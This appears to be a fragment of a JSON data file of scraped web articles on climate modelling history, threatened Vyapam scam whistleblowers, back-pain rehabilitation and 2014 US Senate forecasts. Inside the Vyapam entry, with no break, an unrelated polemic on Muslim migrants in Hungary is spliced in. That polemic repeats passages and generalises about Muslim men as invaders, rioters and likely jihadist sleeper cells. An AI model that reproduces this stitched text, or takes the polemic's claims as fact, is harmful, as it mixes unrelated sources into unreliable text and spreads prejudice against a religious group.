  "latent_7930": "Decades or even centuries from now, when enough time has passed for historians to write definitive accounts of global warming and climate change, two names are likely to make it into history books: Syukuro Manabe and Richard Wetherald.\n\nIn the late-1960s, these two scientists from the Geophysical Fluid Dynamics Laboratory developed one of the very first climate models. In 1967, they published results showing that global temperatures would increase by 2.0 degrees Celsius (3.6 degrees Fahrenheit) if the carbon dioxide content of the atmosphere doubled.\n\nAs Ethan Siegel pointed out in Forbes, carbon dioxide content has risen by roughly 50 percent since the pre-industrial era. Observed temperatures, meanwhile, have increased by 1°C (1.8°F). For a pair of scientists working in a time when computer instructions were compiled on printed punch cards and processing was thousands of times slower than today, they created a remarkably accurate model. That is not to say that Manabe claims his 1967 model is perfect. In fact, he is quick to point out that there are some aspects that his and other climate models still get wrong. In an interview with CarbonBrief, he put it this way:\n\nModels have been very effective in predicting climate change, but have not been as effective in predicting its impact on ecosystem[s] and human society. The distinction between the two has not been stated clearly. For this reason, major effort should be made to monitor globally not only climate change, but also its impact on ecosystem[s] through remote sensing from satellites as well as in-situ observation.\n\nThere is a great deal of fascinating detail about Manabe and Wetherald’s model and the early history of climate modeling that do not fit into a short blog post. If you want to learn more, this section of Spencer Wirt’s the History of Global Warming is well worth the time. The American Institute of Physics has also posted a Q & A with Manabe that covers his 1967 paper, which is considered one of the most influential in climate science. And in March 2017, Manabe and colleague Ronald Stouffer authored a commentary that was published in Nature Climate Change. The Independent also has a good article about this.",

  "latent_8180": "New Delhi\n\nCase 1: A senior bureaucrat in Bhopal allegedly threatened Prashant Pandey, a whistleblower in the Vyapam Scam, inside a closed chamber: “Goli baayen se ghusegi,daayen se nikal jayegi. Bheje ke andar jitna bhara hai, baahar aa jayega. Samaj mein aaya?” [The bullet will pierce through the left side (of the skull) and come out of the right. Whatever is stuffed inside your brain will come out. Got it?]\n\nCase 2: A retired police officer and now a BJP leader Hari Singh Yadav allegedly threatened Ashish Chaturvedi in a public function of dire consequences after the latter officially complained with evidences against Yadav’s son-in-law Deepak Yadav, one of the kingpins of Vyapam scam from Gwalior.\n\nThese cases are tip of an iceberg in the high-profile, multi-crore Madhya Pradesh Professional Examination Board (MPPEB) scam, better known as the Vyapam Scam. The scam has exposed the rampant violation of the Whistleblowers’ Act in the state where the whistleblowers instead of getting immunity, have been physically attacked and threatened.\n\nThe Whistleblowers’ Protection Act is a mechanism to investigate alleged corruption and misuse of power by public servants and also protect anyone who exposes alleged wrongdoing (fraud, scam, corruption or mismanagement) in government bodies or offices.\n\nBut the scenario in MP is altogether different. The whistleblowers who exposed the scam in the conduct of professional examinations related to admission to professional courses and recruitment have been constantly facing threats. One of them, Prashant Pandey, had to leave MP for a safer hideout.\n\nPandey, a 35-year old Digital Forensic expert and an ethical hacker, has been providing his services to the state police, Intelligence Bureau, Special Task Force (STF) and the Income Tax department to crack cases. He is one of the whistleblowers to take the lid off the Vyapam scam. As the scam allegedly involves ‘politicians, bureaucrats and powerful people’, Pandey’s exposé didn’t go down well with the state government. One day, he was picked by the same police for whom he had been working for years.\n\n“I was sent to jail on a false charge of leaking data, about which I was completely unaware. I got bail, but again I was picked up by the police and was taken to police headquarters in Bhopal. They wanted to eliminate me, but at the last moment the plan changed and I was set free. I decided not to work with the police ever. I’ve been attacked half a dozen times. The last time I was attacked was when I was returning from Mhow to Indore with my family by car. A truck hit my car and we were thrown off, and all were badly injured. There’s severe violation of the Whistleblowers’ Act in MP and today, I’m compelled to leave the state that I belong to,” Pandey told Firstpost.\n\nAfter facing 14 attacks and numerous threats to life, 25-year old Ashish Chaturvedi, a student of Master of Social Work, has got security cover from state police. But, it has turned out to be a joke in the state. Chaturvedi, who actively exposed corruption in entrance examinations of medical and dental streams, moves on a bicycle. The police guard rides with him on the same bicycle.\n\n“Despite the constable telling his officers that providing security in this manner won’t be possible, no action has yet been taken. I’ve come to Delhi along with the security guards. But, the irony is that they don’t want to accompany me as I travel either by bus or Metro rail. They want a car to accompany me, which is hilarious,” said Chaturvedi.\n\nThe state unit of the CPI (M) has offered security to Chaturvedi, which the latter has declined politely. “I’m thankful to the CPI (M), but I won’t be able to accept it. But, I’ll continue fighting my battle against corruption,” added Chaturvedi.\n\n“The whistleblower is openly naming the persons who have threatened him, but no action has been taken, like in the case of BJP leader Hari Singh Yadav. The MP High Court has rejected large number of PILs and is not ready to listen to whistleblowers. Madhya Pradesh is in an absolute state of anarchy as the Act has openly been flouted by the government machinery. Our state unit has offered a jeep and protection to Chaturvedi,” said CPI (M), Central Committee member and State Secretary, Badal Saroj.\n\nFormer Union minister and senior Congress leader Kapil Sibal said, “I don’t want to touch upon the Vyapam case as it’s in the Supreme Court. But the genesis of this scam lies in the poor education system of our country. Every parent wants his or her child to become an engineer, doctor or an IT professional. But, when it doesn’t happen, people try to get admission though a corrupt system like Vyapam. There’s not a single political party in India, whose sole focus or agenda had been the education. Scams are not uncommon in education sector in our country, where individual or institutions play the role. But in the Vyapam scam, the state is involved, which is the worst.”\n\nThe stories of the two other whistleblowers – Dr Anand Rai and Ajay Dubey - are no different.\n\n“I’ve been working on RTI since its inception. Vyapam has turned out to be a hotbed of corruption. The most surprising element in Vyapam case is that the corrupt babus used RTI to have an access to OMR sheets of PMT entrance test and filled up the blank sheets in lieu of money to make a candidate pass the exam. The MP government proposed a bill to block RTI applications, but after our fierce opposition it has temporarily been stalled. There is every attempt to gag whistleblowers’ voice. Several times I’ve been threatened to stay away from DMAT and Vyapam cases, which I have been following since 2008,” said Dubey.\n\nBoth Dr Rai, a medical professional from Indore and his wife have had a tough time as besides threats, they faced ‘actions’ from the government in the form of suspension from respective jobs, followed by transfers.\n\nFormer Additional Solicitor General and senior advocate, Vivek K Tankha added, “Whatever is going on in MP is unconstitutional. How can the right to access judiciary be taken away from a person? How can the advocate general of the state decide not to give access to judiciary to an applicant?”\n\nFirstpost is now on WhatsApp. For the latest analysis, commentary and news updates, sign up for our WhatsApp services.

Hungarians were easily outnumbered 200 to 1 by predominantly young Muslim males. These newcomers engaged in sporadic violence, rioted at the sight of camera crews, and left the station littered with human excrement.\n\nThe UN High Commission for Refugees announced on Nov. 2 that the number of people who illegally migrated to Europe in October alone (218,394) nearly outstripped the number of those who entered throughout the whole of 2014 (219,000).\n\n\"[H]alf any given year's total migrants arrive by the start of October. The other half arrives between October and the end of December... If these tendencies remain relevant, we should expect the very opposite of a winter break, and should prepare instead for an increasing flood of people.\" -- Viktor Orbán, Prime Minister of Hungary, September 21, 2015.\n\nEarlier this year, Hungary's ferociously articulate Prime Minister Viktor Orbán became the bête noir of European politics. Since then, Orbán has transitioned from being castigated as a threat to European values, into the most recognized defender of his continent's Christian identity.\n\nIn a Europe whose central policy-makers seem in thrall to multiculturalism, Hungarians, after centuries of invasions and attempted invasions, appear unapologetically immune to political correctness. Even in their language, the colloquial phrase for communicating with the bluntest possible candor is magyarul mondva, literally \"speaking in Hungarian.\"\n\nAs over 400,000 predominantly Muslim migrants crossed illegally into Hungary before the completion of a border fence -- which ground such incursions to an effective halt by the end of October -- there has been a sanctimonious effort in the world's press either to mischaracterize realities on the ground, or omit them altogether.\n\nThe concealment of sobering truths, openly reported in Hungary – ironically a nation whose press freedom has been criticized under Orbán's leadership – can only have serious long-term consequences, in migrant-friendly countries such as Belgium, Sweden and Germany, especially the scale.\n\nThe United Nations High Commission for Refugees (UNHCR) announced on November 2 that the number of people who illegally migrated to Europe in October alone (218,394) nearly outstripped the number of those who entered throughout the whole of 2014 (219,000).\n\nThe figures, which even shocked members of the UNCHR, constitute the greatest monthly entry of illegal migrants into the European Union to date. Many had apparently felt that the legal imposition of quotas, initiated on September 22, and aimed at relocating migrants across EU member states, would have at least begun to tackle the EU's migrant problem.\n\nThe quota scheme, which pivoted on forcing non-consenting member states to accept illegal migrants, has, in fact, been an abject failure. Only Sweden has participated directly.\n\nMeanwhile, crossings from Turkey to nearby islands in Greece, the first step in the so-called Western Balkan route -- the dominant corridor for illegal migrants at present -- have far from peaked, and are accelerating. As winter seas make Mediterranean conditions more difficult, the journey is apparently being offered at a discount.\n\nTo observers who speak Hungarian, however, the UNHCR's figures probably come as no surprise.\n\nAddressing his nation's parliament, on September 21, and calling this year's mass migration to Europe an \"invasion,\" Viktor Orbán declared:\n\nThere will be no such thing as a winter hiatus with respect to the illegal immigration issue ... If one looks at the tables, graphs and statistics -- often available in the public domain -- which show the month-by-month influx of illegal immigrants to date, what one sees largely is that half any given year's total migrants arrive by the start of October. The other half arrives between October and the end of December.\n\nUnlike his European partners, Orbán sees this year's events not as an unprecedented \"crisis,\" but the result of a steady and entirely predictable escalation, centered on the unwillingness of member states to defend the union's external frontiers from human smuggling, which is an obligation under the EU's freedom-of-movement Schengen Treaty.\n\nOrbán's analysis led him to conclude:\n\nThere will be no let up; we should expect escalating pressure. There is no reason for us to think that people-smugglers will arrange their affairs and the routes they exploit any differently this year than they have in previous years. If these tendencies remain relevant, we should expect the very opposite of a winter break, and should prepare instead for an increasing flood of people.\n\nAs Hungary constructed its southern border fence, in line with its Prime Minister's calculations and in consultation with Israel, experts worldwide called the move both pointless and counter-productive.\n\nCurrently, as Germany is opening new migrant reception centers weekly, Hungary is winding up its own.\n\nOn November 3, Hungary's parliament voted overwhelmingly to reject the imposition of mandatory quotas, paving the way for legal action against the EU, in concert with the left-wing government of Slovakia led by Robert Fico. Poland is very likely to follow suit.\n\nMany political analysts have concurred that Orbán has cynically exploited the migration issue to shore up waning domestic popularity. This could not be more wrong. Although Orbán's poll numbers certainly took a slide in 2014, analysts similarly agreed in April that his national consultation on migration constituted a catastrophic miscalculation.\n\nIt is easy to see why. Hungarians, after the 1956 uprising against the Soviet Union, are extremely conscious of their own historic status as genuine refugees. Some national billboards accompanying the nationwide survey were even defaced, as the consultation had posed robust questions on the likely consequences of mass Muslim immigration, which most Hungarians had yet to witness, and which some found discomfiting.\n\nBut public opinion swung firmly in Orbán's favor, with the effective occupation of Budapest's central railway station (Keleti pályaudvar).\n\nThe realities on the ground at Hungary's international railway terminus had to be seen to be believed. Hungarians were easily outnumbered 200 to 1 by predominantly young Muslim males. These newcomers engaged in sporadic violence; rioted at the sight of passing camera crews, and left the station littered with human excrement.\n\nMigrants refusing to cooperate with authorities who wanted to take them to reception centers, to participate in the EU's compulsory EURODAC asylum registration process, chanted \"no fingerprint\" in unison. Frustrated, many charged down motorways towards Austria, a move that led to the closure of major transport arteries.\n\nUnlike the domestic Hungarian media, the international press reported little of the full gravity of events in Hungary. The international press failed to warn nations from Austria to Finland of what was headed their way. Journalists concentrated instead on the handful of children present, to sell a sob story.\n\nSuch reporting led Croatia to charge Hungary with the \"inhumane\" treatment of \"refugees,\" while Austria claimed, astonishingly, that Hungary's behavior was reminiscent of the Holocaust. As migrants arrived in those nations, however, both countries rapidly backtracked.\n\nWhile Hungary was being castigated for supposed xenophobia and for Orbán's rhetoric, no one seemed to have considered that perhaps the most historically-invaded country in Europe knew what an invasion actually looked like, better than most.\n\nNor did many of the people criticizing Hungary stop to think that maybe, with such a prominent awareness of once being refugees themselves, Hungarians might be more cognizant of the gratitude, relief and forbearance that marks the conduct of a genuine refugee.\n\nInstead, Hungary was confronted by aggressive economic migrants in numbers so huge that the authorities were \"all but submerged.\" As the migrants demanded transit to welfare states they had paid handsomely to reach, they threw food and water back at the same Hungarian officials being pilloried by the world's media for their own efforts to cope.\n\nThe nadir of the global press coverage of Hungary came with a defensive action involving tear gas and water cannons, when, on September 16, its frontier post at Röszke was closed to illegal entry. The false story sold by the world's media led the UN Secretary General, Ban Ki-moon, to condemn Hungary.\n\nNo mention was made outside the country of how Hungary's police had reacted solely with non-lethal crowd control tactics -- resorting to these only after a three hour standoff that injured 20 police officers, who had resisted persistent violent efforts to storm the country's border.\n\nThe most conspicuous press failure, however, concerns the key question: With the EU's border agency Frontex confirming on November 4 that 800,000 have illegally crossed into Europe so far in 2015, each likely paying $1000 to $5000 to a people-smuggler, how is this colossal total expenditure -- entirely outside the means of genuine refugee camp residents in Turkey or Jordan -- being funded?\n\nGeorg Spöttle, an Arabic-speaking German national security expert resident in Hungary, with unique access to the intelligence communities in both countries, has been studying the sources of money used by migrants to traverse Europe. He has frequently identified Gulf States, including Saudi Arabia and the United Arab Emirates, as the true source of the funds.\n\nSpöttle has also examined some of the thousands of pictures and videos found on mobile phones discarded by migrants before entering Hungary. Many images, in his view, are likely to be in the possession only \"of those either sympathetic to terrorism or terrorists themselves.\"\n\nFor other observers, the most alarming evidence thrown up in central Europe by this year's migrant influx lies in the nature of the identity documents being discarded, at the last stop on the Western Balkan route, before migrants head towards the EU's freedom-of-movement zone.\n\nThousands of migrants cross illegally into Slovenia on foot, in this screenshot from YouTube video filmed in October 2015.\n\nIn Serbia, the price of superglue has increased 100-fold, given that, when spread across a person's fingertips, it temporarily allows an imprint of bogus fingerprints on a biometric EURODAC scanner.\n\nMany of the documents thrown away at the Hungarian border include genuine Syrian civilian and military identity papers that would automatically entitle their holder to residence in Germany. The act seems highly irregular: Serbian identity papers, valid Swedish residency documents, papers confirming political refugee status from Jordan, and European passports, have all been found strewn across the border.\n\nThe only conclusion that can be drawn from such evidence collected at the EU's external frontier, argues Hungary's most notable security analyst, is that it points to the behavior of individuals intent on establishing jihadist sleeper cells in Europe. Or alternatively, that many Muslims with criminal records, already resident in the EU, could be exploiting the migrant crisis to establish entirely new identities for themselves before disappearing across the continent.\n\nThe only solution to an ever increasing influx, first from the Middle East, and then, in Orbán's view, of even greater numbers from Africa, is to intercept and safely return migrant boats to their points of departure. On May 11, however, this \"pushback\" policy was utterly repudiated by Federica Mogherini, the European Commission's foreign policy chief. Her announcement may well have acted as the spark for this year's unprecedented migrant figures.\n\nOrbán's proposal, a combined European effort to police the narrow stretch of water between Turkey and nearby islands of Greece, has been rejected by the EU's leaders. As a result, hundreds of thousands of people are still being allowed to enter the EU illegally, thanks to the newly strengthened Islamist government of Turkish President Recep Tayyip Erdoğan. At the moment, he is trying to bully Brussels into giving Turkey the features of an actual European Union membership step-by-step.\n\nHungary, perhaps to demonstrate how a combined border-protection initiative could work, is already using a joint cooperation force to defend its own EU frontier, with local partners from Slovakia, the Czech Republic and Poland.\n\nThe presence and power of Mogherini, whose fondness for political Islam has already been analyzed at the Gatestone Institute, is a damning indictment of the European Union's claim to democratic legitimacy.\n\nThanks to what many felt was a profound dissatisfaction with mass migration into the EU, Europe experienced a marked turn to the political right in the 2014 European parliamentary elections.\n\nA conservative European Commission was \"elected\" in turn -- but it nevertheless appointed Mogherini, a former Italian Communist, to the most senior border-protection role in Europe. No matter how its people vote, the commitment of the EU's institutions to a borderless Europe, both internally and externally, appears to remain undaunted.\n\nIt is clear, however, from remarks delivered in his nation's capital on October 31, that Viktor Orbán's patience with the EU has finally been exhausted. \"Europe is being betrayed,\" he told a Christian conference in Budapest. \"It is being taken from us.\"\n\nThousands of migrants shipped to the EU daily, Orbán argued, are \"not a result of indecisiveness,\" but the product of a conscious \"left-wing\" conspiracy to curb the relevance of Europe's sovereign nation states by undermining their ethnic foundations.\n\nWith the EU having no perceptible mandate, this effort amounts to \"treason,\" he said, which must be countered by national democracies turning to their people. If not, he said, these people risk losing the ownership of their continent unless a Europe-wide consultation on mass migration immediately takes place.\n\nThe next migrant wave (50,000) is scheduled to arrive at the Austrian border next week. A ferry strike in Greece has caused a backlog, which is now moving its way through the Balkans.\n\nAccording to Björn Höcke, of the populist Alternative for Germany Party (AfD), by the end of 2016 there will be as many Muslim males of military age in Germany (5.5 million), as there are young German men of that age.\n\nMeanwhile, on November 2, Libya threatened to send to Europe millions of migrants from Africa, unless the EU recognizes its self-declared (Islamist) government.",

  "latent_8573": "Everyone has his or her own expertise in life. For some people they are experts in sitting on the couch with a TV remote and the pizza restaurant on speed dial, others win Olympic Gold. Whatever it is that you do a lot of, you should become good at.\n\nI have studied and treated human beings for a couple of decades. I’ve spent long days and nights in university libraries, late nights in the dissection rooms with cadavers for company, and have amassed a professional career of treating people in pain. I’m good at this and now I’m trying to educate a whole new breed of fitness professionals to become good at fitness rehabilitation. So, let me shine a light for you in the darkness of the back pain night.\n\nDisc “Bulges” Are Not Forever\n\nDisc bulges and injuries can go away without surgery. Even really big disc injuries like the one pictured. Below is a before and after MRI of a patient of mine, who had a huge injury. Look at the after photo and you can see what the spinal canal should look like, then the before and you can see this is a big one. It looks like someone sneezed on his MRI, there is that much junk in the spinal canal. Three months from that MRI to total freedom from disc injury is what he achieved.\n\nAfter an Injury Training Should Be Expected to Return to Normal\n\nI’ve had quite a few patients with disc injuries this big and thousands with lesser size injuries, and I’m close to a 100% success rate in getting them back to whatever they wanted to do. In the case of the guy in the before and after scans, he was back into the gym doing calf raises with 1,000lbs within six months. This was after he got back the control of his calf muscle due to the nerve injury concurrent to the disc injury.\n\nNo, I did not tell him to do those calf raises. It is just what he wanted to do, and I had no problem with his personal choice. I just showed him the tools to achieve his goals as the disc resolved. This is the greatest skill in low back injury treatment - getting the patient back to 100% of pre-injury function. It takes specific exercise application, including strength exercise both for hypertrophy and skill.\n\nOnce the Injury Is Healed, You Do Not Need Ongoing Treatment\n\nDon’t let anyone tell you a disc injury is for life. I’ve got files full of MRI evidence of disc injuries being healed, and they don’t need monthly “adjustments” to keep them “in line” either. These people may naturally incur other injuries in the course of their pursuits, but once I solve a disc injury I expect it to stay that way, as long as the patient keeps doing the work I prescribe (forever), then they can go ahead and pursue the dreams and goals they had interrupted.\n\nThe specific exercises I prescribe will vary with each patient and are related to each personal history, presentation, lifestyle, and occupation. So I can’t give you a cookie-cutter treatment protocol for everyone today, but I just wish to show you that even big problems can be solved. It’s just a matter of finding the right answer and not giving up.\n\nHere below is an example of the disc in the healing process. The balloon-like bulge is being healed and will return to normal. The process is a bit too complex to describe fully in this brief article, but when I teach courses on low back rehabilitation, I go through this process in detail.\n\nLeft: before; Right: after.\n\nPain Can Come From an Uninjured, Normal Scanned Disc\n\nYou do not need to have a disc bulge, rupture, or herniation to have pain from your disc. Sure, the injuries you see on an MRI like above, can be correlated to the symptoms, but experiencing pain that is from a disc and yet having the disc appear perfect on an MRI is certainly a more common clinical picture.1\n\nYou Can Have Pain Without Injury\n\nNot as strange as it first sounds. Most often these pains relate to stretch receptors in the ligamentous tissues being stimulated. I have found these problems the easiest to solve, as it usually involves an examination of the person’s lifestyle and daily postures to provide a solution. Funny enough, these are often the people who come to me after seeing everyone else. The ones that doctors put up their x-rays and scans and can’t find the problem, yet all the while the patient is sitting there slumped on a stool.\n\nYou will find this in many areas of health and fitness, where a client bounces from trainer to trainer or doctor to doctor in despair of finding a solution. There are some classic questions and tests you can learn that will help you sort these people out swiftly, and the solution is usually a significant alteration in the patient’s ergonomic comfort zone, or stopping them from doing an exercise that someone else gave them that is perpetuating the problem, not solving it.\n\nHealing a Person Can Be as Simple as Stopping the Wrong Exercise\n\nAn example of what I just mentioned is pulling your knees to your chest, in the case of posterior disc injury. This classic exercise prescribed in low back pain is from the famous Williams flexion exercises for back pain, these exercises are still prescribed today and are almost as universally wrongly applied as the day they were first published in 1965.2 The concept that spinal flexion exercise is a universal cure for low back pain even flies in the face of 2,400 years of evidence to the contrary that can be traced back to Hippocrates in 400 BC who recommended pressing sharply on the lumbar kyphosis of a patient with low back pain.3\n\nPain Is Not Expected to Be Proportional to the Injury\n\nKnowing low back pain can be present without tissue injury, then it can obviously exist when there is actual damage. But there is no rule that says the pain is proportional to the injury size. Pain is a construct of your mind; biological injury is damage to living tissue. (This is another article in itself.) Simply remember the pain is rarely proportional to the injury. Some of the people I have met in the greatest amount of pain, often in the hospital unable to move from the bed, had little if any demonstrable injury on their scans. And all the biggest disc injuries I have treated were in people who were able to walk through my front door (even if they were dragging their leg).\n\nBiological Healing Time Is Universal\n\nThe biology of healing an injury is universal to human tissue. (A good summary is Evans P. “The Healing Process at Cellular Level: A Review” Physiotherapy, August 1960 vol 66, no. 8.) In back pain, the statistics of injury resolution are approximately 86% of people are feeling better at four weeks post injury and 92% are better at eight weeks, regardless of the treatment.5 This is a good ballpark figure to go by, as I’ve read a heap of studies on back pain resolution and those numbers correlate to clinical practice observations.\n\nThe word better I think is worthy of discussion, because better does not necessarily mean resolved, does it? I aim for back pain resolution, not just better. Remember there is no such thing as a fast healer. There are normal healers or slow healers only (drug assistance not considered). So, you can be out of pain quickly, but remember pain is not injury. Pain is your conscious construction of various inputs, it does not directly relate to healing. It relates to removing the painful inputs to the brain, which may involve healing, but also may not.\n\nI usually have people out of pain fast, but temper their enthusiasm by teaching them to respect the biological healing parameters. Once you remove or reduce the pain, then your client is going to be able to pursue the active components of the rehabilitation exercise to the optimum prescription.\n\nTreat Each Personal as an Individual - They Are Not Recipes!\n\nThe key to full success in treating low back injury, once you have a handle on the cause of the problem, is to understand that each person is different, not different in basic biology, but psychology. This is why in the health and fitness profession, the successful trainers are those who understand each client’s different needs. In the treatment of injury, it’s the same. We have the universal principles of biology, biomechanics, and physics to apply, but we also need an element of understanding human behavior, because this influences the patient’s successful transition for injury to sporting return.\n\nInjuries Can Be Totally Healed and Not Require Ongoing Treatment\n\nOkay, so you now know even big disc injuries are not to be feared. They can be healed totally without lasting deficit. It then requires the perfect combination of passive, active, and neural rehabilitation strengthening exercises and progressions to take the patient back to optimum recovery and return to excellence of performance. (None of which, by the way, requires you to pull your damn belly button in!)\n\nReferences:\n\n1. Bogduk N. 1989, \"Pathology of Lumbar Disc Pain\" AAMM Vol 5 No.1.\n\n2. Williams P.C.

  "latent_8577": "In base­ball, not long ago, there was a long-stand­ing feud between scouts and num­ber-crunch­ing saber­met­ri­cians. Base­ball tra­di­tion­al­ists res­isted the in­flux of new think­ing in­to the game, while the data gurus too of­ten ad­op­ted a dog­mat­ic po­s­i­tion that num­bers al­ways trumped per­son­al re­port­ing and ob­ser­va­tion. It quickly be­came ob­vi­ous that the most suc­cess­ful teams are the ones that util­ized a hy­brid mod­el—the best in scout­ing and stat­ist­ics—and the Money­ball war in base­ball sub­sided.\n\nThat’s not all that dif­fer­ent from what’s hap­pen­ing in polit­ics, where arm­chair pun­dits and num­ber-crunch­ing con­gres­sion­al-race model­ers fre­quently ove­rhype the latest polls, while down­play­ing the broad­er en­vir­on­ment. They’re dir­ectly re­lated. The lead­ing fun­da­ment­als of an elec­tion—pres­id­en­tial ap­prov­al, right track/wrong track, and the con­gres­sion­al gen­er­ic bal­lot, among them—are like “park ef­fects” in base­ball. If a hit­ter is play­ing in the thin air of Den­ver’s Co­ors Field, it’s much easi­er to hit a home run. Like­wise, in a polit­ic­al land­scape where the pres­id­ent is deeply un­pop­u­lar, it’s much easi­er for the mes­sages of the oth­er party’s chal­lengers to res­on­ate, even if they’re run­ning weak­er cam­paigns.\n\nIn Ju­ly, I wrote that the odds of a na­tion­al­ized elec­tion were grow­ing be­cause of that worsen­ing en­vir­on­ment for Demo­crats. Back then, there were clear signs that the red-state races were tilt­ing in the GOP’s dir­ec­tion, while Re­pub­lic­ans were run­ning sur­pris­ingly strong cam­paigns in swing states. Those trends have only so­lid­i­fied since then. The na­tion­al en­vir­on­ment can change over time—few could have pre­dicted a pan­ic over Ebola in the sum­mer, for ex­ample—but it was hard to see the is­sues drag­ging down the pres­id­ent and his party sub­sid­ing by the fall. Now, it’s be­com­ing likely that Re­pub­lic­ans will win more than the six seats ne­ces­sary to re­take con­trol of the Sen­ate.\n\nThroughout this elec­tion cycle, the Demo­crats have been dogged by the pres­id­ent’s health care law. Dis­sat­is­fac­tion over Obama­care, com­poun­ded by its dis­astrous rol­lout, sent the pres­id­ent’s ap­prov­al rat­ings tum­bling. They haven’t re­covered. The law’s pop­ular­ity hasn’t im­proved since then, even with the ad­min­is­tra­tion delay­ing un­pop­u­lar pro­vi­sions un­til after the midterm elec­tions. When Demo­crat­ic sen­at­ors spent time strategiz­ing on how to in­ocu­late them­selves from their past sup­port of the law in­stead of de­fend­ing it, it was clear that this would long re­main a vul­ner­ab­il­ity for the party. In­deed, des­pite con­ven­tion­al wis­dom that health care has di­min­ished as a top is­sue in the midterms, it’s still (by far) the dom­in­ant theme in Re­pub­lic­an con­gres­sion­al cam­paign ads, ac­cord­ing to The Cook Polit­ic­al Re­port‘s Eliza­beth Wil­ner. Not only does it mo­bil­ize angry Re­pub­lic­an voters, but it per­suades dis­af­fected in­de­pend­ents as well.\n\nIn the latest NBC News/Wall Street Journ­al poll, sup­port for the health care law isn’t far from its all-time low, with 36 per­cent sup­port­ing and 48 per­cent op­pos­ing (a whop­ping 43 per­cent op­pos­ing strongly). After the health care web­site de­bacle in Decem­ber 2013, 34 per­cent sup­por­ted and 50 per­cent op­posed. Its po­tency as an is­sue isn’t too far off from 2010, an elec­tion where Re­pub­lic­ans made his­tor­ic gains in the House. Be­fore the 2010 midterms, 36 per­cent of voters lis­ted health care as one of their top two is­sues. Now, it’s at 30 per­cent, rank­ing be­low eco­nom­ic growth, par­tis­an grid­lock, and mil­it­ary ac­tion against IS­IS—but still a po­tent cam­paign theme.\n\nOver the sum­mer, worsen­ing for­eign policy was also an is­sue that looked bound to get worse for Demo­crats, not bet­ter. Pres­id­en­tial speeches and prom­ises can only do so much in com­bat­ing the real­ity of ter­ror­ists gain­ing ground in the Middle East and Rus­si­an Pres­id­ent Vladi­mir Putin mak­ing a land grab in east­ern Ukraine. As George W. Bush learned in his pres­id­ency, when events turn bad over­seas, it’s rare that they im­prove quickly. Pres­id­ent Obama is now talk­ing about de­feat­ing IS­IS in terms of dec­ades, not months or years. The lim­ited air­strikes in Ir­aq and Syr­ia have only had a lim­ited ef­fect, with the ter­ror­ist group creep­ing closer to Bagh­dad des­pite the U.S ef­forts. As a res­ult, the pres­id­ent’s ap­prov­al rat­ings on for­eign policy and na­tion­al se­cur­ity—a first-term strength—have dropped to at or near all-time lows, and haven’t re­covered much with his prime-time ad­dress.\n\nAll told, the cas­cad­ing num­ber of con­tro­ver­sies and scan­dals in the pres­id­ent’s second term has fed in­to the per­cep­tion that this ad­min­is­tra­tion is out of its depth in do­ing its primary job: man­aging gov­ern­ment. And that’s not good for Demo­crats, both the party in power and the party as­so­ci­ated with an act­iv­ist fed­er­al gov­ern­ment. The dom­in­ant theme in the cam­paign’s fi­nal month is Demo­crat­ic Sen­ate can­did­ates strug­gling to dis­tance them­selves from the pres­id­ent, from Arkan­sas Sen. Mark Pry­or’s awk­ward as­sess­ment of the pres­id­ent’s hand­ling of the Ebola crisis to Ken­tucky Sen­ate can­did­ate Al­is­on Lun­der­gan Grimes’s re­fus­al to dis­cuss whom she voted for in the 2012 elec­tion.\n\nRe­pub­lic­ans now are po­si­tioned to net between six and nine Sen­ate seats in the up­com­ing midterms, with the high­er end look­ing more likely. Most of the battle­ground Sen­ate con­tests are now either trend­ing in a Re­pub­lic­an dir­ec­tion or re­main­ing stable with a GOP ad­vant­age. Trail­ing in the North Car­o­lina Sen­ate race throughout much of the fall, Re­pub­lic­an Thom Tillis has lately put Sen. Kay Hagan on the de­fens­ive by con­nect­ing her to the pres­id­ent’s man­age­ment of the IS­IS threat and the out­break of Ebola. In Col­or­ado, GOP Rep. Cory Gard­ner has led in all of the six pub­lic polls re­leased in Oc­to­ber, with leads ran­ging from 2 to 6 points. Early vot­ing data out of Iowa is look­ing fa­vor­able for Re­pub­lic­an Joni Ernst, con­sist­ent with pub­lic polls show­ing her with a small ad­vant­age. The Cook Polit­ic­al Re­port re­cently moved the New Hamp­shire race between Sen. Jeanne Shaheen and Re­pub­lic­an Scott Brown in­to toss-up status, in­dic­at­ive of polling show­ing Shaheen still ahead but with a rap­idly nar­row­ing lead. Out­side of Kan­sas, polit­ic­al ana­lyst Stu­art Rothen­berg now has Re­pub­lic­ans hold­ing an edge in all the red-state races, re­flect­ing a na­tion­al­ized en­vir­on­ment against the party in power.\n\nDemo­crats are hop­ing to upend the rough en­vir­on­ment in con­ser­vat­ive states like Kan­sas, Geor­gia, and South Dakota. All those GOP-held seats fea­ture Re­pub­lic­an can­did­ates who have run weak races. Thanks to ef­fect­ive ads tar­get­ing Dav­id Per­due’s his­tory of out­sourcing (and his ham-handed re­sponses to the at­tacks), Demo­crat Michelle Nunn holds the mo­mentum in the Geor­gia Sen­ate race, though it’s still likely to head in­to a Janu­ary run­off. A late Demo­crat­ic in­vest­ment in South Dakota is keep­ing the four-way race com­pet­it­ive, but GOP re­in­force­ments should push former Re­pub­lic­an Gov. Mike Rounds over the fin­ish line. Even Sen. Pat Roberts of Kan­sas, who has run a dis­mal cam­paign, has got­ten some late trac­tion against in­de­pend­ent can­did­ate Greg Or­man, thanks to a flurry of out­side GOP in­volve­ment. In a neut­ral en­vir­on­ment, Demo­crats would hold a good shot at an up­set or two. But in a na­tion­al­ized midterm, Re­pub­lic­ans should catch breaks in states where the fun­da­ment­als fa­vor them.\n\nAll the trend lines in the House fa­vor Re­pub­lic­ans, as well. The Demo­crat­ic Con­gres­sion­al Cam­paign Com­mit­tee pulled their ad­vert­ising in races that were ex­pec­ted to be among their most win­nable, in­clud­ing against Rep. Mike Coff­man Col­or­ado, Rep. Dan Ben­ishek of Michigan, and Vir­gin­ia Re­pub­lic­an can­did­ate Bar­bara Com­stock—mov­ing the money to pro­tect blue-dis­trict in­cum­bents. Out­side Re­pub­lic­an groups are now spend­ing mil­lions on solidly Demo­crat­ic turf, in­clud­ing dis­tricts in New York, Cali­for­nia, and Hawaii where Obama won by com­fort­able mar­gins. One seni­or House Demo­crat­ic of­fi­cial told Na­tion­al Journ­al that in­tern­al polling in Iowa shows Ernst lead­ing Demo­crat­ic Rep. Bruce Bra­ley in all three of the state’s battle­ground seats, mak­ing it chal­len­ging for down­bal­lot House can­did­ates to put away win­nable races—even in Iowa’s Demo­crat­ic-lean­ing dis­tricts.\n\nPut it all to­geth­er, and it paints the pic­ture of a na­tion­al­ized elec­tion fa­vor­ing the GOP. Demo­crats are hyp­ing their 